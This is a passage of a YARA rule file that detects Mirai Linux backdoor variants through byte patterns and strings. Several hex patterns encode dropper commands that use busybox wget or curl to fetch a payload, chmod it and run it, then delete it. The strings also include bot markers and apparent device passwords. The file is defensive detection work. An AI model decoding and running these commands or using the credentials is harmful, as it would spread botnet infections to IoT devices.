        $x_1_2 = {00 52 e1 0c 00 00 0a 02 c1 91 e7 10 e0 9d e5 04 30 dc e5 0e 00 53 e1 f7 ff ff 1a 00 60 8d e5 14 00 9d e5 09 10 a0}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BY_2147822251_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BY!MTB"
        threat_id = "2147822251"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {62 75 73 79 62 6f 78 20 77 67 65 74 20 2d 67 [0-24] 2d 6c 20 2f 74 6d 70 2f 62 69 67 48 20 2d 72 20 2f 6d 69 70 73}  //weight: 1, accuracy: Low
        $x_1_2 = {63 68 6d 6f 64 20 37 37 37 20 2f 74 6d 70 2f 62 69 67 48 3b 2f 74 6d 70 2f 62 69 67 48 20 [0-8] 2e 72 65 70}  //weight: 1, accuracy: Low
        $x_1_3 = "rm -rf /tmp/bigH" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CE_2147822367_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CE!xp"
        threat_id = "2147822367"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {c0 30 9f e5 00 30 d3 e5 00 00 53 e3 d3 ff ff 0a b0 30 9f e5 00 30 d3 e5 c0}  //weight: 1, accuracy: High
        $x_1_2 = {30 4b e5 14 30 1b e5 23 34 a0 e1 14 30 0b e5 0d 30 5b e5 a3 31 a0 e1 0d 30 4b e5 0d 30 5b e5}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_CF_2147822368_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CF!xp"
        threat_id = "2147822368"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {20 a0 e3 12 a1 a0 e1 a6 32 a0 e1 03 31 a0 e1 94 20 8d e2 02 70 83 e0 8c c0 17 e5 01 80 86 e2 0a c0 8c e1 8c c0}  //weight: 1, accuracy: High
        $x_1_2 = {c0 d2 e5 02 00 81 e2 01 e0 d7 e5 00 a0 d7 e5 0c 54 8b e1 02 b0 d1 e5 01 c0 d0 e5 02 80 d2 e5 02 20 80 e2 02}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_CG_2147822369_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CG!xp"
        threat_id = "2147822369"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {00 40 9e 00 d4 93 bf 00 1c 48 00 ?? ?? 80 01 00 24 83 a1 00 14 83 c1 00 18 7c 08 03 a6 83 e1 00 1c 38 21 00 20 4e 80 00 20 38 80 00 09 3b a0}  //weight: 1, accuracy: Low
        $x_1_2 = {3c e0 10 01 38 e7 d3 7c 3c 60 10 00 38 63 68 28 48 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_CH_2147822371_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CH!xp"
        threat_id = "2147822371"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {01 7f 84 e3 78 38 a0 00 18 38 c0 00 01 7c 7b 1b 78 7f a3 eb 78 48 00 21 29 7f 84 e3 78 38 a0 00 07 38 c0}  //weight: 1, accuracy: High
        $x_1_2 = {4a 14 7c 09 03 a6 4e 80 04 20 81 21 51 44 3a 41 00 08 3a c1 01 2c 2e 09 00 00 38}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_BY_2147822460_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BY!xp"
        threat_id = "2147822460"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {83 c4 10 80 7f 14 1f 77 2a 8b 5f 10 e8 ?? ?? 00 00 66 c1 cb 08 c1 cb 10 66 c1 cb 08 31 c9 8a 4f 14 d3 e8 01 d8 66 c1 c8 08 c1 c8 10 66 c1 c8 08 89 46 10}  //weight: 1, accuracy: Low
        $x_1_2 = {b9 cd cc cc cc 89 c3 f7 e1 89 54 24 0c 89 44 24 08 8b 54 24 0c 89 d8 c1 ea 02 8d 14 92 29 d0 83 f8 04}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BU_2147822821_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BU!MTB"
        threat_id = "2147822821"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {8b 5c 0a 04 0f b7 43 2c 8b 53 1c 66 85 c0 0f b7 f8 0f 84 bd 00 00 00 0f b7 73 2a 01 da 31 c9 31 ed c7 44 24 0c ff ff ff ff}  //weight: 2, accuracy: High
        $x_1_2 = "/dev/watchdog" ascii //weight: 1
        $x_1_3 = "/dev/misc/watchdog" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_CJ_2147822822_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CJ!MTB"
        threat_id = "2147822822"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {83 25 23 e0 ae 39 2e e0 02 30 23 e0 22 c4 23 e0 ff 10 0c e2 2c 28 a0 e1 2c 34 a0 e1 00 00 51 e3 7f 00 51 13 ff 60 02 e2 ff 00 03 e2 2c 2c a0 e1 ee ff ff 0a 03 00 51 e3 ec ff ff 0a 0f 30 41 e2 38 00 51 e3 01 00 53 13}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_Ch_2147822840_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.Ch!MTB"
        threat_id = "2147822840"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {3c 50 9f e5 3c 60 9f e5 00 30 95 e5 00 20 96 e5 34 e0 9f e5 34 40 9f e5 83 35 23 e0 a2 09 22 e0 00 10 9e e5 00 c0 94 e5 00 00 23 e0 23 04 20 e0 00 10 85 e5 00 c0 8e e5 00 20 84 e5 00 00 86 e5}  //weight: 1, accuracy: High
        $x_1_2 = "SERVZUXO" ascii //weight: 1
        $x_1_3 = "killallbots" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Mirai_Ch_2147822840_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.Ch!MTB"
        threat_id = "2147822840"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {30 a0 e3 98 38 8d e5 04 30 83 e2 00 20 a0 e3 ?? 20 83 e7 04 30 83 e2 80 00 53 e3 fa ff ff 1a 18 28 8d e5 7c 30 43 e2 00 50 a0 e3 ?? 50 83 e7 04 30 83 e2 80 00 53 e3 ?? ff ff ?? a6 32 a0 e1 03 91 a0}  //weight: 1, accuracy: Low
        $x_1_2 = {30 d6 e5 b0 30 c3 e3 ?? 30 83 e3 00 30 c6 e5 00 10 d6 e5 01 30 a0 e3 09 30 c6 e5 0a 10 c1 e3 ?? 30 83 e2 05 10 81}  //weight: 1, accuracy: Low
        $x_1_3 = {eb ff 10 00 e2 20 34 a0 e1 20 28 a0 e1 00 00 51 e3 ?? 00 51 13 ff c0 03 e2 ff 20 02 e2 20 ec a0 e1 f5 ff ff 0a 03}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Mirai_Ch_2147822840_2
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.Ch!MTB"
        threat_id = "2147822840"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {1c 55 9f e5 b4 10 96 e5 05 00 a0 e1 ?? ?? 00 eb 00 00 50 e3 1d ff ff 1a 00 34 95 e5 04 00 53 e3 1a ff ff 1a 02 0b 85 e2 08 00 80 e2 ?? ?? 00 eb 00 40 a0 e1 03 0b 85 e2 0c 00 80 e2 ?? ?? 00 eb 00 20 a0 e1 01 0b 85 e2 04 00 80 e2 04 10 a0 e1 ?? ?? 00 eb 0d ff ff ea}  //weight: 1, accuracy: Low
        $x_1_2 = {04 e0 2d e5 24 c0 9f e5 00 30 a0 e1 0c d0 4d e2 00 10 93 e5 04 20 80 e2 00 c0 8d e5 10 00 9f e5 00 c0 a0 e3 0c 30 9f e5 04 c0 8d e5 ?? ?? 00 eb}  //weight: 1, accuracy: Low
        $x_1_3 = {ec 57 9f e5 40 10 96 e5 05 00 a0 e1 ?? ?? 00 eb 00 00 50 e3 02 00 00 1a 00 34 95 e5 04 00 53 e3 fc 00 00 0a}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CM_2147823187_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CM!MTB"
        threat_id = "2147823187"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {62 75 73 79 62 6f 78 20 77 67 65 74 20 68 74 74 70 3a [0-32] 2f 73 68}  //weight: 3, accuracy: Low
        $x_3_2 = "-O -> wwww; sh wwww" ascii //weight: 3
        $x_1_3 = "vdso_clock_gettime" ascii //weight: 1
        $x_1_4 = "hnopqb" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_3_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_CN_2147823188_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CN!MTB"
        threat_id = "2147823188"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {80 71 91 e7 03 40 d7 e7 05 40 24 e0 03 40 c7 e7 80 71 91 e7 03 40 d7 e7 0c 40 24 e0 03 40 c7 e7 80 71 91 e7 03 40 d7 e7 0e 40 24 e0 03 40 c7 e7 80 71 91 e7 03 40 d7 e7 02 40 24 e0 03 40 c7 e7 01 30 83 e2}  //weight: 1, accuracy: High
        $x_1_2 = {f7 03 00 2a a0 02 40 f9 96 02 80 52 f3 c3 02 91 78 19 00 94 c1 02 00 4b a0 02 40 f9 f4 0a c1 1a 94 de 01 1b 73 19 00 94 14 00 14 0b e0 03 13 aa e1 03 14 2a a3 0e 00 94 a0 02 40 f9 e1 03 13 aa 7f ca 34 38}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_CO_2147823189_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CO!MTB"
        threat_id = "2147823189"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {30 43 e2 19 00 53 e3 0c 20 c9 97 05 3a 8d 92 6c c1 93 95 05 ea 8d e2 01 c0 8c e2 6c c1 8e e5 ee ff ff ea 24 00 a0 e3 f6 2a 00 eb 25 00 a0 e3 f4 2a 00}  //weight: 1, accuracy: High
        $x_1_2 = {a0 e1 2c 00 8d e5 28 10 8d e5 16 20 a0 e3 00 30 a0 e3 04 00 a0 e1 05 10 a0 e1 57 07 00 eb 05 10 a0 e1 3c 00 8d e5 15 20 a0 e3 04}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_CP_2147823191_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CP!MTB"
        threat_id = "2147823191"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {90 0a 20 ff 05 00 00 bc 91 2a 20 03 90 02 00 01 c2 12 20 04 80 a0 60 00 04 80 00 1c c4 00 a0 c4 95 30 a0 18 96 10 00 02 99 30 a0 08 9b 30 a0 10 88 10 20 00 c4 02 00 00}  //weight: 1, accuracy: High
        $x_1_2 = {c2 09 00 02 82 18 40 0b c2 29 00 02 c6 02 00 00 c2 09 00 03 82 18 40 0c c2 29 00 03 c4 02 00 00 c2 09 00 02 82 18 40 0d c2 29 00 02 c6 02 00 00 c2 09 00 03 82 18 40 0a c2 29 00 03 88 01 20 01 c2 12 20 04 80 a0 40 04 34 bf ff ee}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CD_2147823561_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CD!MTB"
        threat_id = "2147823561"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {f0 4f 2d e9 08 54 9f e5 08 34 9f e5 05 50 8f e0 03 40 95 e7 00 00 54 e3 83 df 4d e2 0b 00 00 1a f4 03 9f e5 19 1e 8d e2 00 00 85 e0 2c 02 00 eb 00 00 50 e3 d0 41 8d 15 e0 13 9f e5 d0 21 9d e5 01 30 95 e7 02 00 53 e1 01 20 85 17 02 01 00 1b}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_Bv_2147823565_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.Bv!MTB"
        threat_id = "2147823565"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {04 10 90 e5 03 30 96 e7 00 00 51 e3 00 50 93 e5 17}  //weight: 5, accuracy: High
        $x_5_2 = {e0 97 e7 04 20 16 e5 00 30 9e e5 03 c0 c2 e3 08 50 46 e2 03 00 5c e1 05 40 a0 e1 07 00 00 8a 03 30 83 e3 08 30 0e e4 ac 11 a0 e1 04 20 8e e2 01 31 92 e7 08 30 85 e5 01}  //weight: 5, accuracy: High
        $x_1_3 = "attack_spoofed" ascii //weight: 1
        $x_1_4 = "attack_tcp" ascii //weight: 1
        $x_1_5 = "exploiter.c" ascii //weight: 1
        $x_1_6 = "Attackpid" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_5_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_Ci_2147823566_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.Ci!MTB"
        threat_id = "2147823566"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {63 64 20 2f 64 61 74 61 2f 6c 6f 63 61 6c 2f 74 6d 70 3b 20 62 75 73 79 62 6f 78 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-21] 2f 77 67 65 74 20 2d 4f}  //weight: 3, accuracy: Low
        $x_3_2 = {63 75 72 6c 20 2d 4f 20 68 74 74 70 3a 2f 2f [0-21] 2f 63 75 72 6c 3b 20 73 68 20 63 75 72 6c 3b 20 72 6d}  //weight: 3, accuracy: Low
        $x_1_3 = "killed pid" ascii //weight: 1
        $x_1_4 = "9xsspnvgc8aj5pi7m28p" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_3_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_CQ_2147824846_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CQ!MTB"
        threat_id = "2147824846"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {64 64 69 72 00 63 6f 6e 6e 65 63 74 00 5f 5f 66 64 65 6c 74 5f 63 68 6b 00 63 6c 6f 73 65 64 69 72 00 73 69 67 6e}  //weight: 1, accuracy: High
        $x_1_2 = {c0 9f e5 04 c0 2d e5 0c 00 9f e5 0c 30 9f e5 d3 43 00 ea fd 3d 00 eb 28 dc 01 00 f0 02 01 00 d4 80 00 00 f0 4f 2d e9 51 dc 4d e2 74 d0 4d e2 02 40 a0 e1 03}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_CR_2147824847_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CR!MTB"
        threat_id = "2147824847"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 b0 a0 e3 00 e0 a0 e3 04 10 9d e4 0d 20 a0 e1 04 20 2d e5 04 00 2d e5 10 c0 9f e5 04 c0 2d e5 0c 00 9f e5 0c 30 9f e5 ac 2f 00}  //weight: 1, accuracy: High
        $x_1_2 = {a0 e1 15 20 a0 e3 04 00 a0 e1 a0 3d 9f e5 45 07 00 eb 05 10 a0 e1 00 80 a0 e1 17 20 a0 e3 04 00 a0 e1 01 30 a0 e3 71 07 00 eb 05 10 a0 e1 07 20 a0 e3 50 30 a0 e3 00 60 a0 e1 04}  //weight: 1, accuracy: High
        $x_1_3 = {00 80 e3 00 00 c4 e5 00 00 d4 e5 18 c0 9d e5 b0 00 c0 e3 00 50 a0 e3 40 00 80 e3 14 c0 8c e2 00 00 c4 e5 b2 c0 c4 e1 01 50 c4 e5 03 70 a0 e1 01}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_CS_2147824848_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CS!MTB"
        threat_id = "2147824848"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 b4 80 00 00 0d c0 a0 e1 10 d8 2d e9 04 b0 4c e2 24 d0 4d e2 18 00 0b e5 1c 10 0b e5 18 30 1b e5 00 30 d3 e5}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CT_2147824861_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CT!MTB"
        threat_id = "2147824861"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {10 a0 e1 00 a0 a0 e1 16 20 a0 e3 04 00 a0 e1 b4 3d 9f e5 81 07 00 eb 05 10 a0 e1 00 80 a0 e1 18 20 a0 e3 04 00 a0 e1 01 30 a0 e3 73 08 00 eb 05 10 a0 e1 07 20 a0 e3 50 30 a0 e3 00 60 a0}  //weight: 1, accuracy: High
        $x_1_2 = {e3 df 30 43 e2 0c 20 a0 e1 18 c0 4b e2 03 20 cc e7 51 3c e0 e3 e7 30 43 e2 01 20 a0 e1 18 e0 4b e2 03 20 ce e7 00 30 a0 e3 c4 30 0b}  //weight: 1, accuracy: High
        $x_1_3 = {04 e0 9d e4 1e ff 2f e1 ba 79 37 9e 3c 76 02 00 b9 79 37 9e 6c 00 9f e5 00 30 90 e5 01 30 83 e2 f0 41 2d e9 60 80 9f e5 03 ea a0 e1 2e ea a0 e1 0e 21 98 e7 49}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_CU_2147824863_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CU!MTB"
        threat_id = "2147824863"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {a0 e1 b5 dd 4d e2 04 d0 4d e2 08 20 a0 e3 00 30 a0 e3 00 a0 a0 e1 01 b0 a0 e1 04 00 a0 e1 05 10 a0 e1 07 0b 00 eb 05 10 a0 e1 00 70 a0 e1 18 20 a0 e3 04 00 a0 e1 01 30 a0 e3 f9 0b 00}  //weight: 1, accuracy: High
        $x_1_2 = {00 90 e5 0c 10 84 e2 80 20 a0 e3 47 25 00 eb 04 30 94 e5 e0 ff ff ea 10 40 2d e9 00 40 a0 e1}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_CK_2147825027_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CK!MTB"
        threat_id = "2147825027"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {70 40 2d e9 04 d0 4d e2 ?? ?? 00 eb 01 00 70 e3 00 30 a0 13 01 30 a0 03 00 00 50 e3 01 30 83 c3 98 28 9f e5 00 00 53 e3 00 00 82 e5 01 00 00 0a}  //weight: 1, accuracy: Low
        $x_1_2 = {00 40 a0 e3 01 0b 8d e2 08 00 80 e2 ?? ?? 00 eb 01 1b 8d e2 00 20 a0 e1 08 10 81 e2 06 00 a0 e1 01 40 84 e2 01 39 a0 e3 ?? ?? 00 eb 19 00 54 e3 f3 ff ff 1a 06 00 a0 e1 05 10 a0 e1 01 2b a0 e3 01 39 a0 e3 ?? ?? 00 eb 00 00 50 e3 eb ff ff 1a 06 00 a0 e1 ?? ?? 00 eb 6f ff ff ea}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DG_2147825794_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DG!MTB"
        threat_id = "2147825794"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "1tupnq0tuqor1uvqor2vwrps2vwrps2vwrps" ascii //weight: 1
        $x_1_2 = "vifmmuignnvjgnnwkhoowkhoowkhoo" ascii //weight: 1
        $x_1_3 = "2dpnn1dqoo2eqoo3frpp3frpp3frpp" ascii //weight: 1
        $x_1_4 = "vfmgufnhvgnhwhoiwhoiwhoi" ascii //weight: 1
        $x_1_5 = "dsnctodtoeupeupeup" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_DF_2147826630_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DF!MTB"
        threat_id = "2147826630"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "wolfexecbin" ascii //weight: 1
        $x_1_2 = "PLSDIE" ascii //weight: 1
        $x_1_3 = "lolfgt" ascii //weight: 1
        $x_1_4 = "oelinux123" ascii //weight: 1
        $x_1_5 = "tiesseadm" ascii //weight: 1
        $x_1_6 = "hacktheworld1337" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CI_2147826662_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CI!xp"
        threat_id = "2147826662"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 06 00 46 10 08 00 63 24 01 00 08 25 fa ff 04 15 21 28}  //weight: 1, accuracy: High
        $x_1_2 = {34 21 20 20 02 09 f8 20 03 70 00}  //weight: 1, accuracy: High
        $x_1_3 = {08 00 45 24 42 00 43 24 1c 00 42 24 ff ff 63 30}  //weight: 1, accuracy: High
        $x_1_4 = {ff 00 4d 30 ff 00 66 30 ff 00 89 30 ff 00 ac}  //weight: 1, accuracy: High
        $x_1_5 = {00 02 12 02 00 02 72 16 00 02 7a 15}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_X_2147827069_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.X!MTB"
        threat_id = "2147827069"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {04 00 a0 e1 ?? 01 00 eb 01 00 80 e2 ?? 02 00 eb 04 10 a0 e1 07 00 85 e7 ?? 01 00 eb 00 00 a0 e3 ?? ?? 9f e5 ?? ?? 00 eb 00 40 50 e2 01 60 86 e2 04 50 85 e2 f1 ff ff 1a}  //weight: 1, accuracy: Low
